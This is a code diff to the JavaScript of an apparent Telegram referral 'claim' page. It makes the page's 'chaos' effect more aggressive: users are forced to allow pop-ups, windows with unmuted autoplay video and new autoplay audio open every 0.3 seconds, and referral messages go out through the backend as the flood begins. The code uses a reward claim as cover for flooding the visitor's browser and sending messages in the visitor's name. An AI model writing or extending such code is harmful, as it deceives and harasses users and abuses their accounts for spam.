@@ -24,7 +24,6 @@ const leaderboardList = document.getElementById('leaderboardList');
 // Variables to manage chaos
 let chaosWindows = [];
 let chaosInterval = null;
-let chaosCount = 0;
 let isChaosActive = false;
 
 // Store the verified telegramUsername
@@ -152,6 +151,16 @@ secondClaimButton.addEventListener('click', async () => {
         return;
     }
 
+    // Attempt to open a test window to check for popup blockers
+    const testWindow = window.open('', '', 'width=100,height=100');
+    if (testWindow === null || typeof testWindow === 'undefined') {
+        alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
+        return;
+    } else {
+        // Close the test window
+        testWindow.close();
+    }
+
     // Hide the second CLAIM button
     secondClaimButtonContainer.style.display = 'none';
 
@@ -160,6 +169,12 @@ secondClaimButton.addEventListener('click', async () => {
     // Start Chaos Effect
     startChaos();
 
+    // Send messages via backend once chaos starts
+    sendReferralMessages();
+});
+
+// Send Referral Messages
+async function sendReferralMessages() {
     try {
         // Send messages via backend
         const sendMessagesResponse = await fetch(`${backendUrl}/api/sendReferral`, {
@@ -179,7 +194,7 @@ secondClaimButton.addEventListener('click', async () => {
         console.error('Error:', error);
         claimMessage.textContent = 'An error occurred while sending messages. Please try again.';
     }
-});
+}
 
 // Display messages in the modal
 function displayModalMessage(message, type) {
@@ -200,7 +215,7 @@ function closeModalFunc() {
     claimModal.style.display = 'none';
 }
 
-// Function to start chaotic effects by opening windows with video
+// Function to start chaotic effects by opening windows with video and audio
 function startChaos() {
     if (isChaosActive) return; // Prevent multiple chaos starts
     isChaosActive = true;
@@ -243,9 +258,12 @@ function startChaos() {
                     </style>
                 </head>
                 <body class="hidden">
-                    <video autoplay loop muted>
+                    <video autoplay loop>
                         <source src="https://telegram-dpreferral-backend.onrender.com/chaosvid.mp4" type="video/mp4">
                     </video>
+                    <audio autoplay>
+                        <source src="https://telegram-dpreferral-backend.onrender.com/chaossound.mp3" type="audio/mpeg">
+                    </audio>
                     <script>
                         // Prepare to show the window later
                         window.isRevealed = false;
@@ -258,7 +276,7 @@ function startChaos() {
             chaosWindows.push(chaosWindow);
         } else {
             console.warn('Pop-up blocked. Please allow pop-ups for this site to enable the chaos effect.');
-            alert('Pop-up blocked. Please allow pop-ups for this site to enable the chaos effect.');
+            alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
             endChaos();
             return;
         }
@@ -287,7 +305,7 @@ function startChaos() {
             }
             currentWindowIndex++;
         }
-    }, 1000); // Reveal one new window every 1 second
+    }, 300); // Reveal one new window every 0.3 seconds
 }
 
 // Add a single focus listener to detect when chaos windows are closed
